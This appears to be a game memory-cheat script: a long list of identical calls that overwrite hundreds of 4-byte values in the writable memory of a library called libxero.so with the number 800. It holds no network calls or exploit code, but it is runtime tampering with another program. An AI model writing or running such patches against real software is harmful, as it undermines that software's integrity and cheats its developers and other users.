Modify(Read('libxero.so','rw-p')+0xa96c,800,4)
Modify(Read('libxero.so','rw-p')+0xa97c,800,4)
Modify(Read('libxero.so','rw-p')+0xa98c,800,4)
Modify(Read('libxero.so','rw-p')+0xa99c,800,4)
Modify(Read('libxero.so','rw-p')+0xa9ac,800,4)
Modify(Read('libxero.so','rw-p')+0xa9bc,800,4)
Modify(Read('libxero.so','rw-p')+0xa9cc,800,4)
Modify(Read('libxero.so','rw-p')+0xa9dc,800,4)
Modify(Read('libxero.so','rw-p')+0xa9ec,800,4)
Modify(Read('libxero.so','rw-p')+0xa9fc,800,4)
Modify(Read('libxero.so','rw-p')+0xaa0c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa1c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa2c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa3c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa4c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa5c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa6c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa7c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa8c,800,4)
Modify(Read('libxero.so','rw-p')+0xaa9c,800,4)
Modify(Read('libxero.so','rw-p')+0xaaac,800,4)
Modify(Read('libxero.so','rw-p')+0xaabc,800,4)
Modify(Read('libxero.so','rw-p')+0xaacc,800,4)
Modify(Read('libxero.so','rw-p')+0xaadc,800,4)
Modify(Read('libxero.so','rw-p')+0xaaec,800,4)
Modify(Read('libxero.so','rw-p')+0xaafc,800,4)
Modify(Read('libxero.so','rw-p')+0xab0c,800,4)
Modify(Read('libxero.so','rw-p')+0xab1c,800,4)
Modify(Read('libxero.so','rw-p')+0xab2c,800,4)
Modify(Read('libxero.so','rw-p')+0xab3c,800,4)
Modify(Read('libxero.so','rw-p')+0xab4c,800,4)
Modify(Read('libxero.so','rw-p')+0xab5c,800,4)
Modify(Read('libxero.so','rw-p')+0xab6c,800,4)
Modify(Read('libxero.so','rw-p')+0xab7c,800,4)
Modify(Read('libxero.so','rw-p')+0xab8c,800,4)
Modify(Read('libxero.so','rw-p')+0xab9c,800,4)
Modify(Read('libxero.so','rw-p')+0xabac,800,4)
Modify(Read('libxero.so','rw-p')+0xabbc,800,4)
Modify(Read('libxero.so','rw-p')+0xabcc,800,4)
Modify(Read('libxero.so','rw-p')+0xabdc,800,4)
Modify(Read('libxero.so','rw-p')+0xabec,800,4)
Modify(Read('libxero.so','rw-p')+0xabfc,800,4)
Modify(Read('libxero.so','rw-p')+0xac0c,800,4)
Modify(Read('libxero.so','rw-p')+0xac1c,800,4)
Modify(Read('libxero.so','rw-p')+0xac2c,800,4)
Modify(Read('libxero.so','rw-p')+0xac3c,800,4)
Modify(Read('libxero.so','rw-p')+0xac4c,800,4)
Modify(Read('libxero.so','rw-p')+0xac5c,800,4)
Modify(Read('libxero.so','rw-p')+0xac6c,800,4)
Modify(Read('libxero.so','rw-p')+0xac7c,800,4)
Modify(Read('libxero.so','rw-p')+0xac8c,800,4)
Modify(Read('libxero.so','rw-p')+0xac9c,800,4)
Modify(Read('libxero.so','rw-p')+0xacac,800,4)
Modify(Read('libxero.so','rw-p')+0xacbc,800,4)
Modify(Read('libxero.so','rw-p')+0xaccc,800,4)
Modify(Read('libxero.so','rw-p')+0xacdc,800,4)
Modify(Read('libxero.so','rw-p')+0xacec,800,4)
Modify(Read('libxero.so','rw-p')+0xacfc,800,4)
Modify(Read('libxero.so','rw-p')+0xad0c,800,4)
Modify(Read('libxero.so','rw-p')+0xad1c,800,4)
Modify(Read('libxero.so','rw-p')+0xad2c,800,4)
Modify(Read('libxero.so','rw-p')+0xad3c,800,4)
Modify(Read('libxero.so','rw-p')+0xad4c,800,4)
Modify(Read('libxero.so','rw-p')+0xad5c,800,4)
Modify(Read('libxero.so','rw-p')+0xad6c,800,4)
Modify(Read('libxero.so','rw-p')+0xad7c,800,4)
Modify(Read('libxero.so','rw-p')+0xad8c,800,4)
Modify(Read('libxero.so','rw-p')+0xad9c,800,4)
Modify(Read('libxero.so','rw-p')+0xadac,800,4)
Modify(Read('libxero.so','rw-p')+0xadb8,800,4)
Modify(Read('libxero.so','rw-p')+0xadbc,800,4)
Modify(Read('libxero.so','rw-p')+0xadc0,800,4)
Modify(Read('libxero.so','rw-p')+0xadc4,800,4)
Modify(Read('libxero.so','rw-p')+0xadcc,800,4)
Modify(Read('libxero.so','rw-p')+0xaddc,800,4)
Modify(Read('libxero.so','rw-p')+0xadec,800,4)
Modify(Read('libxero.so','rw-p')+0xadfc,800,4)
Modify(Read('libxero.so','rw-p')+0xae0c,800,4)
Modify(Read('libxero.so','rw-p')+0xae1c,800,4)
Modify(Read('libxero.so','rw-p')+0xae2c,800,4)
Modify(Read('libxero.so','rw-p')+0xae3c,800,4)
Modify(Read('libxero.so','rw-p')+0xae4c,800,4)
Modify(Read('libxero.so','rw-p')+0xae5c,800,4)
Modify(Read('libxero.so','rw-p')+0xae6c,800,4)
Modify(Read('libxero.so','rw-p')+0xae7c,800,4)
Modify(Read('libxero.so','rw-p')+0xae8c,800,4)
Modify(Read('libxero.so','rw-p')+0xae9c,800,4)
Modify(Read('libxero.so','rw-p')+0xaeac,800,4)
Modify(Read('libxero.so','rw-p')+0xaebc,800,4)
Modify(Read('libxero.so','rw-p')+0xaecc,800,4)
Modify(Read('libxero.so','rw-p')+0xaedc,800,4)
Modify(Read('libxero.so','rw-p')+0xaeec,800,4)
Modify(Read('libxero.so','rw-p')+0xaefc,800,4)
Modify(Read('libxero.so','rw-p')+0xaf0c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf1c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf2c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf3c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf4c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf5c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf6c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf7c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf8c,800,4)
Modify(Read('libxero.so','rw-p')+0xaf9c,800,4)
Modify(Read('libxero.so','rw-p')+0xafac,800,4)
Modify(Read('libxero.so','rw-p')+0xafbc,800,4)
Modify(Read('libxero.so','rw-p')+0xafcc,800,4)
Modify(Read('libxero.so','rw-p')+0xafdc,800,4)
Modify(Read('libxero.so','rw-p')+0xafec,800,4)
Modify(Read('libxero.so','rw-p')+0xaffc,800,4)
Modify(Read('libxero.so','rw-p')+0xb00c,800,4)
Modify(Read('libxero.so','rw-p')+0xb01c,800,4)
Modify(Read('libxero.so','rw-p')+0xb02c,800,4)
Modify(Read('libxero.so','rw-p')+0xb03c,800,4)
Modify(Read('libxero.so','rw-p')+0xb04c,800,4)
Modify(Read('libxero.so','rw-p')+0xb05c,800,4)
Modify(Read('libxero.so','rw-p')+0xb06c,800,4)
Modify(Read('libxero.so','rw-p')+0xb07c,800,4)
Modify(Read('libxero.so','rw-p')+0xb08c,800,4)
Modify(Read('libxero.so','rw-p')+0xb09c,800,4)
Modify(Read('libxero.so','rw-p')+0xb0ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb0bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb0cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb0dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb0ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb0fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb10c,800,4)
Modify(Read('libxero.so','rw-p')+0xb11c,800,4)
Modify(Read('libxero.so','rw-p')+0xb12c,800,4)
Modify(Read('libxero.so','rw-p')+0xb13c,800,4)
Modify(Read('libxero.so','rw-p')+0xb14c,800,4)
Modify(Read('libxero.so','rw-p')+0xb15c,800,4)
Modify(Read('libxero.so','rw-p')+0xb16c,800,4)
Modify(Read('libxero.so','rw-p')+0xb17c,800,4)
Modify(Read('libxero.so','rw-p')+0xb18c,800,4)
Modify(Read('libxero.so','rw-p')+0xb19c,800,4)
Modify(Read('libxero.so','rw-p')+0xb1ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb1bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb1cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb1dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb1ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb1fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb20c,800,4)
Modify(Read('libxero.so','rw-p')+0xb21c,800,4)
Modify(Read('libxero.so','rw-p')+0xb22c,800,4)
Modify(Read('libxero.so','rw-p')+0xb23c,800,4)
Modify(Read('libxero.so','rw-p')+0xb24c,800,4)
Modify(Read('libxero.so','rw-p')+0xb25c,800,4)
Modify(Read('libxero.so','rw-p')+0xb26c,800,4)
Modify(Read('libxero.so','rw-p')+0xb27c,800,4)
Modify(Read('libxero.so','rw-p')+0xb28c,800,4)
Modify(Read('libxero.so','rw-p')+0xb29c,800,4)
Modify(Read('libxero.so','rw-p')+0xb2ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb2bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb2cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb2dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb2e8,800,4)
Modify(Read('libxero.so','rw-p')+0xb2ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb2f0,800,4)
Modify(Read('libxero.so','rw-p')+0xb2f4,800,4)
Modify(Read('libxero.so','rw-p')+0xb2fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb30c,800,4)
Modify(Read('libxero.so','rw-p')+0xb31c,800,4)
Modify(Read('libxero.so','rw-p')+0xb32c,800,4)
Modify(Read('libxero.so','rw-p')+0xb338,800,4)
Modify(Read('libxero.so','rw-p')+0xb33c,800,4)
Modify(Read('libxero.so','rw-p')+0xb340,800,4)
Modify(Read('libxero.so','rw-p')+0xb344,800,4)
Modify(Read('libxero.so','rw-p')+0xb34c,800,4)
Modify(Read('libxero.so','rw-p')+0xb35c,800,4)
Modify(Read('libxero.so','rw-p')+0xb36c,800,4)
Modify(Read('libxero.so','rw-p')+0xb378,800,4)
Modify(Read('libxero.so','rw-p')+0xb37c,800,4)
Modify(Read('libxero.so','rw-p')+0xb380,800,4)
Modify(Read('libxero.so','rw-p')+0xb384,800,4)
Modify(Read('libxero.so','rw-p')+0xb38c,800,4)
Modify(Read('libxero.so','rw-p')+0xb39c,800,4)
Modify(Read('libxero.so','rw-p')+0xb3ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb3bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb3cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb3dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb3ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb3fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb40c,800,4)
Modify(Read('libxero.so','rw-p')+0xb41c,800,4)
Modify(Read('libxero.so','rw-p')+0xb42c,800,4)
Modify(Read('libxero.so','rw-p')+0xb43c,800,4)
Modify(Read('libxero.so','rw-p')+0xb44c,800,4)
Modify(Read('libxero.so','rw-p')+0xb45c,800,4)
Modify(Read('libxero.so','rw-p')+0xb46c,800,4)
Modify(Read('libxero.so','rw-p')+0xb47c,800,4)
Modify(Read('libxero.so','rw-p')+0xb48c,800,4)
Modify(Read('libxero.so','rw-p')+0xb49c,800,4)
Modify(Read('libxero.so','rw-p')+0xb4ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb4b8,800,4)
Modify(Read('libxero.so','rw-p')+0xb4bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb4c0,800,4)
Modify(Read('libxero.so','rw-p')+0xb4c4,800,4)
Modify(Read('libxero.so','rw-p')+0xb4cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb4dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb4ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb4fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb50c,800,4)
Modify(Read('libxero.so','rw-p')+0xb51c,800,4)
Modify(Read('libxero.so','rw-p')+0xb52c,800,4)
Modify(Read('libxero.so','rw-p')+0xb53c,800,4)
Modify(Read('libxero.so','rw-p')+0xb54c,800,4)
Modify(Read('libxero.so','rw-p')+0xb55c,800,4)
Modify(Read('libxero.so','rw-p')+0xb56c,800,4)
Modify(Read('libxero.so','rw-p')+0xb57c,800,4)
Modify(Read('libxero.so','rw-p')+0xb58c,800,4)
Modify(Read('libxero.so','rw-p')+0xb59c,800,4)
Modify(Read('libxero.so','rw-p')+0xb5ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb5b8,800,4)
Modify(Read('libxero.so','rw-p')+0xb5bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb5c0,800,4)
Modify(Read('libxero.so','rw-p')+0xb5c4,800,4)
Modify(Read('libxero.so','rw-p')+0xb5cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb5dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb5ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb5fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb60c,800,4)
Modify(Read('libxero.so','rw-p')+0xb61c,800,4)
Modify(Read('libxero.so','rw-p')+0xb62c,800,4)
Modify(Read('libxero.so','rw-p')+0xb63c,800,4)
Modify(Read('libxero.so','rw-p')+0xb64c,800,4)
Modify(Read('libxero.so','rw-p')+0xb65c,800,4)
Modify(Read('libxero.so','rw-p')+0xb66c,800,4)
Modify(Read('libxero.so','rw-p')+0xb678,800,4)
Modify(Read('libxero.so','rw-p')+0xb67c,800,4)
Modify(Read('libxero.so','rw-p')+0xb680,800,4)
Modify(Read('libxero.so','rw-p')+0xb684,800,4)
Modify(Read('libxero.so','rw-p')+0xb68c,800,4)
Modify(Read('libxero.so','rw-p')+0xb69c,800,4)
Modify(Read('libxero.so','rw-p')+0xb6ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb6b8,800,4)
Modify(Read('libxero.so','rw-p')+0xb6bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb6c0,800,4)
Modify(Read('libxero.so','rw-p')+0xb6c4,800,4)
Modify(Read('libxero.so','rw-p')+0xb6cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb6dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb6ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb6fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb70c,800,4)
Modify(Read('libxero.so','rw-p')+0xb71c,800,4)
Modify(Read('libxero.so','rw-p')+0xb72c,800,4)
Modify(Read('libxero.so','rw-p')+0xb73c,800,4)
Modify(Read('libxero.so','rw-p')+0xb74c,800,4)
Modify(Read('libxero.so','rw-p')+0xb75c,800,4)
Modify(Read('libxero.so','rw-p')+0xb76c,800,4)
Modify(Read('libxero.so','rw-p')+0xb77c,800,4)
Modify(Read('libxero.so','rw-p')+0xb78c,800,4)
Modify(Read('libxero.so','rw-p')+0xb79c,800,4)
Modify(Read('libxero.so','rw-p')+0xb7ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb7bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb7cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb7dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb7ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb7fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb80c,800,4)
Modify(Read('libxero.so','rw-p')+0xb81c,800,4)
Modify(Read('libxero.so','rw-p')+0xb82c,800,4)
Modify(Read('libxero.so','rw-p')+0xb83c,800,4)
Modify(Read('libxero.so','rw-p')+0xb84c,800,4)
Modify(Read('libxero.so','rw-p')+0xb85c,800,4)
Modify(Read('libxero.so','rw-p')+0xb86c,800,4)
Modify(Read('libxero.so','rw-p')+0xb878,800,4)
Modify(Read('libxero.so','rw-p')+0xb87c,800,4)
Modify(Read('libxero.so','rw-p')+0xb880,800,4)
Modify(Read('libxero.so','rw-p')+0xb884,800,4)
Modify(Read('libxero.so','rw-p')+0xb88c,800,4)
Modify(Read('libxero.so','rw-p')+0xb89c,800,4)
Modify(Read('libxero.so','rw-p')+0xb8ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb8bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb8cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb8dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb8ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb8fc,800,4)
Modify(Read('libxero.so','rw-p')+0xb90c,800,4)
Modify(Read('libxero.so','rw-p')+0xb91c,800,4)
Modify(Read('libxero.so','rw-p')+0xb92c,800,4)
Modify(Read('libxero.so','rw-p')+0xb93c,800,4)
Modify(Read('libxero.so','rw-p')+0xb94c,800,4)
Modify(Read('libxero.so','rw-p')+0xb95c,800,4)
Modify(Read('libxero.so','rw-p')+0xb96c,800,4)
Modify(Read('libxero.so','rw-p')+0xb97c,800,4)
Modify(Read('libxero.so','rw-p')+0xb988,800,4)
Modify(Read('libxero.so','rw-p')+0xb98c,800,4)
Modify(Read('libxero.so','rw-p')+0xb990,800,4)
Modify(Read('libxero.so','rw-p')+0xb994,800,4)
Modify(Read('libxero.so','rw-p')+0xb99c,800,4)
Modify(Read('libxero.so','rw-p')+0xb9ac,800,4)
Modify(Read('libxero.so','rw-p')+0xb9bc,800,4)
Modify(Read('libxero.so','rw-p')+0xb9cc,800,4)
Modify(Read('libxero.so','rw-p')+0xb9dc,800,4)
Modify(Read('libxero.so','rw-p')+0xb9ec,800,4)
Modify(Read('libxero.so','rw-p')+0xb9fc,800,4)
Modify(Read('libxero.so','rw-p')+0xba0c,800,4)
Modify(Read('libxero.so','rw-p')+0xba1c,800,4)
Modify(Read('libxero.so','rw-p')+0xba2c,800,4)
Modify(Read('libxero.so','rw-p')+0xba3c,800,4)
Modify(Read('libxero.so','rw-p')+0xba4c,800,4)
Modify(Read('libxero.so','rw-p')+0xba5c,800,4)
Modify(Read('libxero.so','rw-p')+0xba6c,800,4)
Modify(Read('libxero.so','rw-p')+0xba7c,800,4)
Modify(Read('libxero.so','rw-p')+0xba8c,800,4)
Modify(Read('libxero.so','rw-p')+0xba9c,800,4)
Modify(Read('libxero.so','rw-p')+0xbaac,800,4)
Modify(Read('libxero.so','rw-p')+0xbabc,800,4)
Modify(Read('libxero.so','rw-p')+0xbac8,800,4)
Modify(Read('libxero.so','rw-p')+0xbacc,800,4)
Modify(Read('libxero.so','rw-p')+0xbad0,800,4)
Modify(Read('libxero.so','rw-p')+0xbad4,800,4)
Modify(Read('libxero.so','rw-p')+0xbadc,800,4)
Modify(Read('libxero.so','rw-p')+0xbaec,800,4)
Modify(Read('libxero.so','rw-p')+0xbafc,800,4)
Modify(Read('libxero.so','rw-p')+0xbb0c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb1c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb2c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb3c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb4c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb5c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb6c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb7c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb8c,800,4)
Modify(Read('libxero.so','rw-p')+0xbb9c,800,4)
Modify(Read('libxero.so','rw-p')+0xbba8,800,4)
Modify(Read('libxero.so','rw-p')+0xbbac,800,4)
Modify(Read('libxero.so','rw-p')+0xbbb0,800,4)
Modify(Read('libxero.so','rw-p')+0xbbb4,800,4)
Modify(Read('libxero.so','rw-p')+0xbbb8,800,4)
Modify(Read('libxero.so','rw-p')+0xbbbc,800,4)
Modify(Read('libxero.so','rw-p')+0xbbc4,800,4)
Modify(Read('libxero.so','rw-p')+0xbbc8,800,4)
Modify(Read('libxero.so','rw-p')+0xbbcc,800,4)
Modify(Read('libxero.so','rw-p')+0xbbd4,800,4)
Modify(Read('libxero.so','rw-p')+0xbbe4,800,4)
Modify(Read('libxero.so','rw-p')+0xbbf4,800,4)
Modify(Read('libxero.so','rw-p')+0xbc04,800,4)
Modify(Read('libxero.so','rw-p')+0xbc14,800,4)
Modify(Read('libxero.so','rw-p')+0xbc24,800,4)
Modify(Read('libxero.so','rw-p')+0xbc34,800,4)
Modify(Read('libxero.so','rw-p')+0xbc44,800,4)
Modify(Read('libxero.so','rw-p')+0xbc54,800,4)
Modify(Read('libxero.so','rw-p')+0xbc64,800,4)
Modify(Read('libxero.so','rw-p')+0xbc74,800,4)
Modify(Read('libxero.so','rw-p')+0xbc84,800,4)
Modify(Read('libxero.so','rw-p')+0xbc94,800,4)
Modify(Read('libxero.so','rw-p')+0xbca4,800,4)
Modify(Read('libxero.so','rw-p')+0xbcb4,800,4)
Modify(Read('libxero.so','rw-p')+0xbcc4,800,4)
Modify(Read('libxero.so','rw-p')+0xbcd4,800,4)
Modify(Read('libxero.so','rw-p')+0xbce4,800,4)
Modify(Read('libxero.so','rw-p')+0xbcf4,800,4)
Modify(Read('libxero.so','rw-p')+0xbd04,800,4)
Modify(Read('libxero.so','rw-p')+0xbd14,800,4)
Modify(Read('libxero.so','rw-p')+0xbd24,800,4)
Modify(Read('libxero.so','rw-p')+0xbd30,800,4)
Modify(Read('libxero.so','rw-p')+0xbd34,800,4)
Modify(Read('libxero.so','rw-p')+0xbd38,800,4)
Modify(Read('libxero.so','rw-p')+0xbd3c,800,4)
Modify(Read('libxero.so','rw-p')+0xbd44,800,4)
Modify(Read('libxero.so','rw-p')+0xbd54,800,4)
Modify(Read('libxero.so','rw-p')+0xbd64,800,4)
Modify(Read('libxero.so','rw-p')+0xbd74,800,4)
Modify(Read('libxero.so','rw-p')+0xbd84,800,4)
Modify(Read('libxero.so','rw-p')+0xbd94,800,4)
Modify(Read('libxero.so','rw-p')+0xbda4,800,4)
Modify(Read('libxero.so','rw-p')+0xbdb4,800,4)
Modify(Read('libxero.so','rw-p')+0xbdc4,800,4)
Modify(Read('libxero.so','rw-p')+0xbdd4,800,4)
Modify(Read('libxero.so','rw-p')+0xbde4,800,4)
Modify(Read('libxero.so','rw-p')+0xbdf0,800,4)
Modify(Read('libxero.so','rw-p')+0xbdf4,800,4)
Modify(Read('libxero.so','rw-p')+0xbdf8,800,4)
Modify(Read('libxero.so','rw-p')+0xbdfc,800,4)
Modify(Read('libxero.so','rw-p')+0xbe04,800,4)
Modify(Read('libxero.so','rw-p')+0xbe14,800,4)
Modify(Read('libxero.so','rw-p')+0xbe24,800,4)
Modify(Read('libxero.so','rw-p')+0xbe34,800,4)
Modify(Read('libxero.so','rw-p')+0xbe44,800,4)
Modify(Read('libxero.so','rw-p')+0xbe54,800,4)
Modify(Read('libxero.so','rw-p')+0xbe64,800,4)
Modify(Read('libxero.so','rw-p')+0xbe74,800,4)
Modify(Read('libxero.so','rw-p')+0xbe84,800,4)
Modify(Read('libxero.so','rw-p')+0xbe94,800,4)
Modify(Read('libxero.so','rw-p')+0xbea4,800,4)
Modify(Read('libxero.so','rw-p')+0xbeb4,800,4)
Modify(Read('libxero.so','rw-p')+0xbec4,800,4)
Modify(Read('libxero.so','rw-p')+0xbed4,800,4)
Modify(Read('libxero.so','rw-p')+0xbee4,800,4)
Modify(Read('libxero.so','rw-p')+0xbef4,800,4)
Modify(Read('libxero.so','rw-p')+0xbf04,800,4)
Modify(Read('libxero.so','rw-p')+0xbf14,800,4)
Modify(Read('libxero.so','rw-p')+0xbf24,800,4)
Modify(Read('libxero.so','rw-p')+0xbf34,800,4)
Modify(Read('libxero.so','rw-p')+0xbf44,800,4)
Modify(Read('libxero.so','rw-p')+0xbf54,800,4)
Modify(Read('libxero.so','rw-p')+0xbf64,800,4)
Modify(Read('libxero.so','rw-p')+0xbf74,800,4)
Modify(Read('libxero.so','rw-p')+0xbf84,800,4)
Modify(Read('libxero.so','rw-p')+0xbf94,800,4)
Modify(Read('libxero.so','rw-p')+0xbfa4,800,4)
Modify(Read('libxero.so','rw-p')+0xbfb4,800,4)
Modify(Read('libxero.so','rw-p')+0xbfc4,800,4)
Modify(Read('libxero.so','rw-p')+0xbfd4,800,4)
Modify(Read('libxero.so','rw-p')+0xbfe4,800,4)
Modify(Read('libxero.so','rw-p')+0xbff4,800,4)
Modify(Read('libxero.so','rw-p')+0xc004,800,4)
Modify(Read('libxero.so','rw-p')+0xc014,800,4)
Modify(Read('libxero.so','rw-p')+0xc024,800,4)
Modify(Read('libxero.so','rw-p')+0xc030,800,4)
Modify(Read('libxero.so','rw-p')+0xc034,800,4)
Modify(Read('libxero.so','rw-p')+0xc038,800,4)
Modify(Read('libxero.so','rw-p')+0xc03c,800,4)
Modify(Read('libxero.so','rw-p')+0xc044,800,4)
Modify(Read('libxero.so','rw-p')+0xc054,800,4)
Modify(Read('libxero.so','rw-p')+0xc064,800,4)
Modify(Read('libxero.so','rw-p')+0xc074,800,4)
Modify(Read('libxero.so','rw-p')+0xc084,800,4)
Modify(Read('libxero.so','rw-p')+0xc094,800,4)
Modify(Read('libxero.so','rw-p')+0xc0a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc0b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc0c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc0d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc0e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc0f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc104,800,4)
Modify(Read('libxero.so','rw-p')+0xc114,800,4)
Modify(Read('libxero.so','rw-p')+0xc124,800,4)
Modify(Read('libxero.so','rw-p')+0xc134,800,4)
Modify(Read('libxero.so','rw-p')+0xc140,800,4)
Modify(Read('libxero.so','rw-p')+0xc144,800,4)
Modify(Read('libxero.so','rw-p')+0xc148,800,4)
Modify(Read('libxero.so','rw-p')+0xc14c,800,4)
Modify(Read('libxero.so','rw-p')+0xc154,800,4)
Modify(Read('libxero.so','rw-p')+0xc164,800,4)
Modify(Read('libxero.so','rw-p')+0xc174,800,4)
Modify(Read('libxero.so','rw-p')+0xc184,800,4)
Modify(Read('libxero.so','rw-p')+0xc194,800,4)
Modify(Read('libxero.so','rw-p')+0xc1a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc1b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc1c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc1d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc1e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc1f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc204,800,4)
Modify(Read('libxero.so','rw-p')+0xc214,800,4)
Modify(Read('libxero.so','rw-p')+0xc224,800,4)
Modify(Read('libxero.so','rw-p')+0xc234,800,4)
Modify(Read('libxero.so','rw-p')+0xc244,800,4)
Modify(Read('libxero.so','rw-p')+0xc254,800,4)
Modify(Read('libxero.so','rw-p')+0xc264,800,4)
Modify(Read('libxero.so','rw-p')+0xc274,800,4)
Modify(Read('libxero.so','rw-p')+0xc284,800,4)
Modify(Read('libxero.so','rw-p')+0xc294,800,4)
Modify(Read('libxero.so','rw-p')+0xc2a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc2b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc2c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc2d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc2e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc2f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc304,800,4)
Modify(Read('libxero.so','rw-p')+0xc314,800,4)
Modify(Read('libxero.so','rw-p')+0xc324,800,4)
Modify(Read('libxero.so','rw-p')+0xc334,800,4)
Modify(Read('libxero.so','rw-p')+0xc344,800,4)
Modify(Read('libxero.so','rw-p')+0xc354,800,4)
Modify(Read('libxero.so','rw-p')+0xc364,800,4)
Modify(Read('libxero.so','rw-p')+0xc374,800,4)
Modify(Read('libxero.so','rw-p')+0xc384,800,4)
Modify(Read('libxero.so','rw-p')+0xc394,800,4)
Modify(Read('libxero.so','rw-p')+0xc3a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc3b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc3c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc3d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc3e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc3f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc404,800,4)
Modify(Read('libxero.so','rw-p')+0xc414,800,4)
Modify(Read('libxero.so','rw-p')+0xc424,800,4)
Modify(Read('libxero.so','rw-p')+0xc434,800,4)
Modify(Read('libxero.so','rw-p')+0xc444,800,4)
Modify(Read('libxero.so','rw-p')+0xc454,800,4)
Modify(Read('libxero.so','rw-p')+0xc464,800,4)
Modify(Read('libxero.so','rw-p')+0xc474,800,4)
Modify(Read('libxero.so','rw-p')+0xc484,800,4)
Modify(Read('libxero.so','rw-p')+0xc494,800,4)
Modify(Read('libxero.so','rw-p')+0xc4a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc4b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc4c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc4d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc4e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc4f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc504,800,4)
Modify(Read('libxero.so','rw-p')+0xc514,800,4)
Modify(Read('libxero.so','rw-p')+0xc524,800,4)
Modify(Read('libxero.so','rw-p')+0xc534,800,4)
